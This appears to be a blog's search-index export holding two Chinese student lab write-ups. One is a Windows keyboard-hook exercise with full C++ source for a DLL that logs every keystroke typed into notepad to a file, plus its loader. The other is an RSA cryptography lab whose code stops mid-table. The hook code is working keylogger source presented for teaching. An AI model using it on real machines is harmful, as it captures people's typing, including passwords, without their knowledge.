<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>键盘消息钩取学习</title>
      <link href="/2019/11/12/%E9%94%AE%E7%9B%98%E6%B6%88%E6%81%AF%E9%92%A9%E5%8F%96%E5%AD%A6%E4%B9%A0/"/>
      <url>/2019/11/12/%E9%94%AE%E7%9B%98%E6%B6%88%E6%81%AF%E9%92%A9%E5%8F%96%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="键盘消息钩取学习"><a href="#键盘消息钩取学习" class="headerlink" title="键盘消息钩取学习"></a>键盘消息钩取学习</h2><blockquote><p>题目：修改 HookDll.cpp，钩取对 notepad 的输入，使得：<br>a) 输入文本仍能正常显示<br>b) 所有输入文本能够记录到 input.txt 文件中 </p></blockquote><a id="more"></a><hr><h3 id="编译环境"><a href="#编译环境" class="headerlink" title="编译环境"></a>编译环境</h3><blockquote><p>两份代码均为vs2019 Debug x64模式编译</p></blockquote><hr><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><blockquote><p>即首先修改HookDll.cpp，生成一个Dll文件，在编写一个cpp文件，从生成的dll导入HookStart和HookStop两个函数，实现键盘钩子</p></blockquote><hr><h3 id="题目注意事项"><a href="#题目注意事项" class="headerlink" title="题目注意事项"></a>题目注意事项</h3><blockquote><p>因为notepad是64位，32位的钩子无法钩取64位notepad的消息，所以dll和另一个cpp文件都需要是64位，如果出现32位的cpp文件和64位dll文件等混用情况，会报出内存冲突错误<br>dll名字要写对，否则会读取失败，注意大小写<br>因为读取的是虚拟按键，所以字母统一钩取的为大写字母<br>小键盘和数字键盘虚拟按键不一样，小键盘读取的是小写字母</p></blockquote><hr><h3 id="未修改版HookDll-cpp源码"><a href="#未修改版HookDll-cpp源码" class="headerlink" title="未修改版HookDll.cpp源码"></a>未修改版HookDll.cpp源码</h3><blockquote><p>HookDll.cpp源代码<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"tchar.h"</span></span></span><br><span class="line"></span><br><span class="line">HINSTANCE g_hInstance = <span class="literal">NULL</span>;</span><br><span class="line">HHOOK g_hHook = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)</span></span>&#123;</span><br><span class="line"><span class="keyword">switch</span>( dwReason )&#123;</span><br><span class="line">        <span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line">g_hInstance = hinstDLL;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">KeyboardProc</span><span class="params">(<span class="keyword">int</span> nCode, WPARAM wParam, LPARAM lParam)</span></span>&#123;</span><br><span class="line">TCHAR szPath[MAX_PATH] = &#123;<span class="number">0</span>,&#125;;</span><br><span class="line">TCHAR *p = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( nCode &gt;= <span class="number">0</span> ) &#123;</span><br><span class="line"><span class="keyword">if</span>( !(lParam &amp; <span class="number">0x80000000</span>) )&#123; <span class="comment">//lParam的第31位（0：按键；1：释放键）</span></span><br><span class="line">GetModuleFileName(<span class="literal">NULL</span>, szPath, MAX_PATH);</span><br><span class="line">p = _tcsrchr(szPath, _T(<span class="string">'\\'</span>));</span><br><span class="line">            <span class="comment">//若装载当前DLL的进程为notepad.exe，则消息不会传递给下一个钩子</span></span><br><span class="line"><span class="keyword">if</span>( !lstrcmpi(p + <span class="number">1</span>, _T(<span class="string">"notepad.exe"</span>)) )</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">// 当前进程不是notepad.exe，将消息传递给下一个钩子</span></span><br><span class="line"><span class="keyword">return</span> CallNextHookEx(g_hHook, nCode, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">__declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">HkStart</span><span class="params">()</span> </span>&#123;</span><br><span class="line">g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">HkStop</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span>( g_hHook ) &#123;</span><br><span class="line">UnhookWindowsHookEx(g_hHook);</span><br><span class="line">g_hHook = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure></p></blockquote><hr><h3 id="题目代码"><a href="#题目代码" class="headerlink" title="题目代码"></a>题目代码</h3><p>HookDll.cpp(编译出Dll文件的代码)<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdio.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"windows.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义目标进程名为notepad.exe</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEF_PROCESS_NAME <span class="meta-string">"notepad.exe"</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//定义全局变量</span></span><br><span class="line">HINSTANCE g_hInstance = <span class="literal">NULL</span>;</span><br><span class="line">HHOOK g_hHook = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//DllMain()函数在DLL被加载到进程后会自动执行</span></span><br><span class="line"><span class="function">BOOL WINAPI <span class="title">DllMain</span><span class="params">(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)</span> </span>&#123;</span><br><span class="line"><span class="keyword">switch</span> (dwReason) &#123;</span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_ATTACH:</span><br><span class="line"><span class="comment">//当DLLMain处理DLL_PROCESS_ATTACH时，DLLMain函数的返回值表示DLL的初始化是否成功。成功返回TRUE，否则返回FALSE。</span></span><br><span class="line">g_hInstance = hinstDLL;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> DLL_PROCESS_DETACH:</span><br><span class="line"><span class="comment">//当DLL处理DLL_PROCESS_DETACH时，DLL应该处理与进程相关的清理操作。</span></span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="function">LRESULT CALLBACK <span class="title">KeyboardProc</span><span class="params">(<span class="keyword">int</span> nCode, WPARAM wParam, LPARAM lParam)</span> </span>&#123;</span><br><span class="line"><span class="keyword">char</span> szPath[MAX_PATH] = &#123; <span class="number">0</span>, &#125;;</span><br><span class="line"><span class="keyword">char</span>* p = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (nCode &gt;= <span class="number">0</span>) &#123;<span class="comment">//nCode是一个钩子标识码，钩子过程会利用它决定下一步的进行的操作。这个标识嘛的值与安装的钩子类型相关</span></span><br><span class="line"><span class="keyword">if</span> (!(lParam &amp; <span class="number">0x80000000</span>)) &#123;<span class="comment">//if(lParam&amp;0x80000000)，键按下，else，键弹起</span></span><br><span class="line"><span class="comment">//键弹起的时候</span></span><br><span class="line">GetModuleFileNameA(<span class="literal">NULL</span>, szPath, MAX_PATH);<span class="comment">//获取当前程序运行的绝对路径</span></span><br><span class="line">p = <span class="built_in">strrchr</span>(szPath, <span class="string">'\\'</span>);<span class="comment">//获取在路径中最右边的\\出现的位置</span></span><br><span class="line"><span class="keyword">if</span> (!_stricmp(p + <span class="number">1</span>, DEF_PROCESS_NAME)) &#123;<span class="comment">//此处比较是否是notepad.exe</span></span><br><span class="line"><span class="keyword">char</span> c =wParam;<span class="comment">//获取消息</span></span><br><span class="line">FILE* fp = fopen(<span class="string">"C:\\Users\\dell\\Desktop\\input.txt"</span>, <span class="string">"a+"</span>);</span><br><span class="line">fwrite(&amp;c, <span class="number">1</span>, <span class="number">1</span>,fp);</span><br><span class="line">fclose(fp);</span><br><span class="line">CallNextHookEx(g_hHook, nCode, wParam, lParam);<span class="comment">//传递给之后的钩子或者应用程序，保证消息不被拦截，实现正常输入</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//比较当前进程名称，若非notepad.exe，则消息传递给应用程序或下一个钩子函数</span></span><br><span class="line"><span class="keyword">return</span> CallNextHookEx(g_hHook, nCode, wParam, lParam);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//__cplusplus是cpp中的自定义宏，定义了这个宏的说明此代码是cpp代码，加入extern "C"&#123;...&#125;会以C语言方式处理其中的代码。因为C++支持重载等高级特性</span></span><br><span class="line"><span class="comment">//如果不以C语言方式编译，容易报错</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">"C"</span> &#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"><span class="comment">//__declspec，针对编译器的关键字，用于指出导出函数</span></span><br><span class="line">__declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">HookStart</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="comment">//SetWindowsHookEx()函数就会将KeyboardProc()添加到键盘钩链</span></span><br><span class="line">g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">__declspec(dllexport) <span class="function"><span class="keyword">void</span> <span class="title">HookStop</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (g_hHook) &#123;</span><br><span class="line"><span class="comment">//卸载钩子</span></span><br><span class="line">UnhookWindowsHookEx(g_hHook);</span><br><span class="line">g_hHook = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> __cplusplus</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure></p><p>Maincpp，为了读取Dll中的函数，实现让用户决定是否继续钩取<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;conio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEF_DLL_NAME <span class="meta-string">"HookDll.dll"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEF_HOOKSTART <span class="meta-string">"HookStart"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEF_HOOKSTOP <span class="meta-string">"HookStop"</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*PFN_HOOKSTART)</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">void</span> <span class="params">(*PFN_HOOKSTOP)</span><span class="params">()</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HMODULE hDll=<span class="literal">NULL</span>;</span><br><span class="line">    PFN_HOOKSTART HookStart=<span class="literal">NULL</span>;</span><br><span class="line">    PFN_HOOKSTOP HookStop=<span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">char</span> ch=<span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//加载KeyHook.dll</span></span><br><span class="line">    hDll=LoadLibraryA(DEF_DLL_NAME);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//获取导出函数地址</span></span><br><span class="line">    HookStart=(PFN_HOOKSTART)GetProcAddress(hDll,DEF_HOOKSTART);</span><br><span class="line">    HookStop=(PFN_HOOKSTART)GetProcAddress(hDll,DEF_HOOKSTOP);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//开始钩取</span></span><br><span class="line">    HookStart();</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//等待直到用户输入“q”</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"press 'q' to quit!\n"</span>);</span><br><span class="line">    <span class="keyword">while</span>(_getch()!=<span class="string">'q'</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//终止钩取</span></span><br><span class="line">    HookStop();</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//卸载KeyHook.dll</span></span><br><span class="line">    FreeLibrary(hDll);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> 开发相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 键盘消息钩取学习 </tag>
            
            <tag> Windows编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学实验</title>
      <link href="/2019/11/08/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AE%9E%E9%AA%8C/"/>
      <url>/2019/11/08/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AE%9E%E9%AA%8C/</url>
      
        <content type="html"><![CDATA[<h2 id="密码学实验"><a href="#密码学实验" class="headerlink" title="密码学实验"></a>密码学实验</h2><p>这是现代密码学配套实验，可以在实验中加深对现代密码学的了解，也可以加强自己的编程能力。<br><a id="more"></a></p><h3 id="实验三"><a href="#实验三" class="headerlink" title="实验三"></a>实验三</h3><blockquote><p>1.RSA加密时，存在某些e和m使得m^e mod n=m。现在在给定的 p=1009，q=3643，找出所有e，满足1&lt;e&lt;φ(1009,3643)且gcd(e,φ)=1，并且此时未加密信息的数目为最小值。求出所有这些e的和。<br>2.自己编写函数根据RSA流程完成字符串加密，并且对字符串进行处理<br>3.对给出的21个Frame，使用不同的RSA攻击方法破解出明文。(2016年密码数学挑战赛的赛题三)</p></blockquote><hr><blockquote><p>第一题，套用计算隐藏消息数的公式[gcd（e -1，p -1）+1] [gcd（e -1，q -1）+1]即可<br><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#-*-coding:utf<span class="string">-8</span> -*-</span><br><span class="line">def gcd(a, b):</span><br><span class="line">    while b:</span><br><span class="line">        a, b = b, a % b</span><br><span class="line">    return a</span><br><span class="line">p, q, s, e = 1009, 3643, 0, 3</span><br><span class="line">phi = (p<span class="string">-1</span>) * (q<span class="string">-1</span>)</span><br><span class="line">#[gcd（e <span class="string">-1</span>，p <span class="string">-1</span>）<span class="string">+1</span>] [gcd（e <span class="string">-1</span>，q <span class="string">-1</span>）<span class="string">+1</span>]是公式,phi是偶数，为了让gcd(e, phi)==1成立，所以e必须是奇数，那么e<span class="string">-1</span>必是偶数，q<span class="string">-1</span>和p<span class="string">-1</span>都为偶数，</span><br><span class="line">#让gcd（e <span class="string">-1</span>，p <span class="string">-1</span>）<span class="string">+1</span>最小，即gcd(e<span class="string">-1</span>, q<span class="string">-1</span>)==2即可</span><br><span class="line">while (e &lt; phi):</span><br><span class="line">    if gcd(e, phi)==1 and gcd(e<span class="string">-1</span>, q<span class="string">-1</span>)==2 and gcd(e<span class="string">-1</span>, p<span class="string">-1</span>)==2:</span><br><span class="line">        s += e</span><br><span class="line">    e += 2</span><br><span class="line">print ("Project Euler 182 Solution =", s)</span><br></pre></td></tr></table></figure></p></blockquote><blockquote><p>第二题，手写一下RSA基本流程即可<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="comment"># python 3.x</span></span><br><span class="line"><span class="comment"># Matasano Problem 39</span></span><br><span class="line"><span class="comment"># Implement RSA</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> binascii  <span class="comment">#binascii模块包含很多在二进制和ASCII编码的二进制表示之间的转换方法</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">generatePrime</span><span class="params">(bits)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> getPrime(bits);  <span class="comment"># 返回一个最大为 N bit的随机素数</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mypow</span><span class="params">(a, b, c)</span>:</span> <span class="comment"># returns a^b mod c</span></span><br><span class="line">    <span class="keyword">if</span> (b == <span class="number">0</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span> </span><br><span class="line">    <span class="keyword">if</span> (b == <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">return</span> (a % c)</span><br><span class="line">    b_bits = bin(b)[<span class="number">2</span>:]</span><br><span class="line">    res = a;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, len(b_bits)):     </span><br><span class="line">        res = res * res;</span><br><span class="line">        <span class="keyword">if</span> (b_bits[i] == <span class="string">'1'</span> ):</span><br><span class="line">            res = res * a;</span><br><span class="line">        res = res % c;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line"></span><br><span class="line">rawToHexLUT = [<span class="string">'00'</span>, <span class="string">'01'</span>, <span class="string">'02'</span>, <span class="string">'03'</span>, <span class="string">'04'</span>, <span class="string">'05'</span>, <span class="string">'06'</span>, <span class="string">'07'</span>, <span class="string">'08'</span>, <span class="string">'09'</span>, <span class="string">'0a'</span>, <span class="string">'0b'</span>, <span class="string">'0c'</span>, <span class="string">'0d'</span>, <span class="string">'0e'</span>, <span class="string">'0f'</span>,</span><br><span class="line">               <span class="string">'10'</span>, <span class="string">'11'</span>, <span class="string">'12'</span>, <span class="string">'13'</span>, <span class="string">'14'</span>, <span class="string">'15'</span>, <span class="string">'16'</span>, <span class="string">'17'</span>, <span class="string">'18'</span>, <span class="string">'19'</span>, <span class="string">'1a'</span>, <span class="string">'1b'</span>, <span class="string">'1c'</span>, <span class="string">'1d'</span>, <span class="string">'1e'</span>, <span class="string">'1f'</span>,</span><br><span class="line">               <span class="string">'20'</span>, <span class="string">'21'</span>, <span class="string">'22'</span>, <span class="string">'23'</span>, <span class="string">'24'</span>, <span class="string">'25'</span>, <span class="string">'26'</span>, <span class="string">'27'</span>, <span class="string">'28'</span>, <span class="string">'29'</span>, <span class="string">'2a'</span>, <span class="string">'2b'</span>, <span class="string">'2c'</span>, <span class="string">'2d'</span>, <span class="string">'2e'</span>, <span class="string">'2f'</span>,</span><br><span class="line">               <span class="string">'30'</span>, <span class="string">'31'</span>, <span class="string">'32'</span>, <span class="string">'33'</span>, <span class="string">'34'</span>, <span class="string">'35'</span>, <span class="string">'36'</span>, <span class="string">'37'</span>, <span class="string">'38'</span>, <span class="string">'39'</span>, <span class="string">'3a'</span>, <span class="string">'3b'</span>, <span class="string">'3c'</span>, <span class="string">'3d'</span>, <span class="string">'3e'</span>, <span class="string">'3f'</span>,</span><br><span class="line">               <span class="string">'40'</span>, <span class="string">'41'</span>, <span class="string">'42'</span>, <span class="string">'43'</span>, <span class="string">'44'</span>, <span class="string">'45'</span>, <span class="string">'46'</span>, <span class="string">'47'</span>, <span class="string">'48'</span>, <span class="string">'49'</span>, <span class="string">'4a'</span>, <span class="string">'4b'</span>, <span class="string">'4c'</span>, <span class="string">'4d'</span>, <span class="string">'4e'</span>, <span class="string">'4f'</span>,</span><br><span class="line">               <span class="string">'50'</span>, <span class="string">'51'</span>, <span class="string">'52'</span>, <span class="string">'53'</span>, <span class="string">'54'</span>, <span class="string">'55'</span>, <span class="string">'56'</span>, <span class="string">'57'</span>, <span class="string">'58'</span>, <span class="string">'59'</span>, <span class="string">'5a'</span>, <span class="string">'5b'</span>, <span class="string">'5c'</span>, <span class="string">'5d'</span>, <span class="string">'5e'</span>, <span class="string">'5f'</span>,</span><br><span class="line">               <span class="string">'60'</span>, <span class="string">'61'</span>, <span class="string">'62'</span>, <span class="string">'63'</span>, <span class="string">'64'</span>, <span class="string">'65'</span>, <span class="string">'66'</span>, <span class="string">'67'</span>, <span class="string">'68'</span>, <span class="string">'69'</span>, <span class="string">'6a'</span>, <span class="string">'6b'</span>, <span class="string">'6c'</span>, <span class="string">'6d'</span>, <span class="string">'6e'</span>, <span class="string">'6f'</span>,</span><br><span class="line">               <span class="string">'70'</span>, <span class="string">'71'</span>, <span class="string">'72'</span>, <span class="string">'73'</span>, <span class="string">'74'</span>, <span class="string">'75'</span>, <span class="string">'76'</span>, <span class="string">'77'</span>, <span class="string">'78'</span>, <span class="string">'79'</span>, <span class="string">'7a'</span>, <span class="string">'7b'</span>, <span class="string">'7c'</span>, <span class="string">'7d'</span>, <span class="string">'7e'</span>, <span class="string">'7f'</span>,</span><br><span class="line">               <span class="string">'80'</span>, <span class="string">'81'</span>, <span class="string">'82'</span>, <span class="string">'83'</span>, <span class="string">'84'</span>, <span class="string">'85'</span>, <span class="string">'86'</span>, <span class="string">'87'</span>, <span class="string">'88'</span>, <span class="string">'89'</span>, <span class="string">'8a'</span>, <span class="string">'8b'</span>, <span class="string">'8c'</span>, <span class="string">'8d'</span>, <span class="string">'8e'</span>, <span class="string">'8f'</span>,</span><br><span class="line">               <span class="string">'90'</span>, <span class="string">'91'</span>, <span class="string">'92'</span>, <span class="string">'93'</span>, <span class="string">'94'</span>, <span class="string">'95'</span>, <span class="string">'96'</span>, <span class="string">'97'</span>, <span class="string">'98'</span>, <span class="string">'99'</span>, <span class="string">'9a'</span>, <span class="string">'9b'</span>, <span class="string">'9c'</span>, <span class="string">'9d'</span>, <span class="string">'9e'</span>, <span class="string">'9f'</span>,</span><br><span class="line">               <span class="string">'a0'</span>, <span class="string">'a1'</span>, <span class="string">'a2'</span>, <span class="string">'a3'</span>, <span class="string">'a4'</span>, <span class="string">'a5'</span>, <span class="string">'a6'</span>, <span class="string">'a7'</span>, <span class="string">'a8'</span>, <span class="string">'a9'</span>, <span class="string">'aa'</span>, <span class="string">'ab'</span>, <span class="string">'ac'</span>, <span class="string">'ad'</span>, <span class="string">'ae'</span>, <span class="string">'af'</span>,</span><br><span class="line">               <span class="string">'b0'</span>, <span 